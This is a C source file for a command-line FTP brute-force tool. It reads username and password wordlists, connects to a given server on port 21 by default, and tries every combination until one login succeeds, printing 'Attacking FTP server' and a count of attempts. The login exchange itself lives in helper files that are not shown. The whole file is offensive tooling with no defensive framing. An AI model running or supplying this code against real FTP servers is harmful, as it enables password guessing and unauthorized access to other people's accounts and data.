#include <stdio.h>
#include <sys/socket.h>     /* for socket(), connect(), send(), and recv() */
#include <arpa/inet.h>      /* for sockaddr_in and inet_addr() */
#include <stdlib.h>         /* for atoi() and exit() */
#include <unistd.h>         /* for close() */
#include "Utils.h"
#include "HandleTCPServer.h"


int main(int argc, char *argv[])
{
	int sock;                /* Socket descriptor */
	unsigned short servPort; /* Echo server port */
	char *servIP;            /* Server IP address (dotted quad) */
	char userline[20];
	char passline[20];
	char *username;
	char *password;
	int success = 0;
	int sucindicator = 0;
	int attempts = 0;

	if ((argc < 4) || (argc > 5))
	{
		fprintf(stderr, "Usage: %s <Server IP> [<Port>] [<userFile>] [<PasswordFile>]\n",argv[0]);
		exit(1);
	}

	servIP = argv[1];
	if (argc == 5)
	{
		servPort = atoi(argv[2]);
		username = argv[3];
		password = argv[4];
	}
	else
	{
		servPort = 21;   /* Default to 21 */
		username = argv[2];
		password = argv[3];
	}


	FILE* unFile = fopen(username, "r");
	if(unFile == NULL)
	{
		printf("File [%s] does not exist. Program will now exit\n", username);
		exit(1);
	}


	FILE* passFile = fopen(password, "r");
	if(passFile == NULL)
	{
		printf("File [%s] does not exist. Program will now exit\n", password);
		exit(1);
	}


	 printf(" == Connecting to: %s on %d ==\n", servIP, servPort);
   	 printf(" == Attacking FTP server ==\n");
         printf("***********************************************\n");

	while(fgets(userline, sizeof(userline), unFile))
	{
		username = strtok(userline, "\r\n.");

		while(fgets(passline, sizeof(passline), passFile))
		{
			attempts++;
			password = strtok(passline, "\r\n.");
			sock = createAndConnectSocket(servIP, servPort);
			printf("****************************************************\n");
			printf("Testing : UserName [%s] with Password : [%s]\n", userline, passline);
			printf("Attempt No: %i Success No: %i\n", attempts, success);
			printf("****************************************************\n");
			sucindicator = 0;
			HandleTCPServer(sock, username, password, &success, &sucindicator);
			close(sock);
			if(sucindicator == 1)
			{
				success++;
				break;
			}
		}
		rewind(passFile);

		// break our on success
		if (sucindicator==1)
		{
			break;
		}

	}
	fclose(passFile);
	fclose(unFile);
       printf("***********************************************************\n");
       printf(" == FTP Client End. ==\n");
       printf(" == Login Attempts: %i\n Successful Logins: %i ==\n", attempts, success);
       printf("***********************************************************\n");

	return 0;
}
